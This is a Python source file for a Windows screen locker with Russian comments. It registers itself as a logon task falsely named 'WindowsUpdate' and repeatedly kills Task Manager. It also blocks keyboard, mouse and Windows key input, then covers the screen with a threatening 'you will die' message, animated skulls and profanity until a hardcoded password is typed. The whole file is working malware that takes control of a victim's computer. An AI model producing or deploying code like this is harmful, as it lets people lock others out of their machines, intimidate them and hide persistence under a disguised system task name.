import ctypes
import os
import sys
import time
import threading
import random
import math
import tkinter as tk

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 600

# === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === БЛОКИРУЕМ WIN-КЛАВИШУ ===
def block_win_key():
    try:
        import keyboard
        keyboard.add_hotkey('windows', lambda: None, suppress=True)
        keyboard.add_hotkey('win', lambda: None, suppress=True)
    except:
        pass

# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.1)

# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
def add_to_startup():
    import subprocess
    script_path = os.path.abspath(__file__)
    command = f'python "{script_path}"'
    subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)

# === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Центральные надписи
        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
        
        # Поле ввода
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
        self.canvas.create_window(400, 360, window=self.entry)
        self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def draw_skull(self, x, y, laugh_frame):
        """Рисует ASCII-череп, который смеётся"""
        eye_h = 20 + (5 if laugh_frame % 10 < 5 else -5)
        # Голова
        self.canvas.create_oval(x-40, y-30, x+40, y+30, outline='white', width=2)
        # Глаза
        self.canvas.create_oval(x-20, y-15, x-10, y-5, fill='white')
        self.canvas.create_oval(x+10, y-15, x+20, y-5, fill='white')
        # Нос
        self.canvas.create_polygon(x-10, y+5, x+10, y+5, x, y+15, fill='white')
        # Рот (смеётся)
        if laugh_frame % 10 < 5:
            self.canvas.create_arc(x-30, y+10, x+30, y+50, start=200, extent=140, style='arc', outline='white', width=2)
        else:
            self.canvas.create_rectangle(x-30, y+15, x+30, y+35, outline='white', width=2)
    
    def draw_fuck(self, x, y, frame):
        """Рисует ASCII-надпись 'FUCK'"""
        if frame % 20 < 10:
            self.canvas.create_text(x, y, text="FUCK", fill='white', font=('Courier', 24, 'bold'))
        else:
            self.canvas.create_text(x, y, text="F*CK", fill='gray', font=('Courier', 24, 'bold'))
    
    def animate(self):
        self.canvas.delete("skull")
        self.canvas.delete("fuck")
        
        # Рисуем 5 черепов в случайных местах
        for i in range(5):
            x = random.randint(100, 700)
            y = random.randint(200, 500)
            self.draw_skull(x, y, int(time.time() * 10) + i)
        
        # Рисуем 3 "фака"
        for i in range(3):
            x = random.randint(100, 700)
            y = random.randint(100, 500)
            self.draw_fuck(x, y, int(time.time() * 10) + i)
        
        # Мерцание главной надписи
        if random.random() < 0.1:
            self.canvas.itemconfig("title", fill='gray')
        else:
            self.canvas.itemconfig("title", fill='white')
        
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=block_win_key, daemon=True).start()
    app = WinLocker()
    app.root.mainloop()
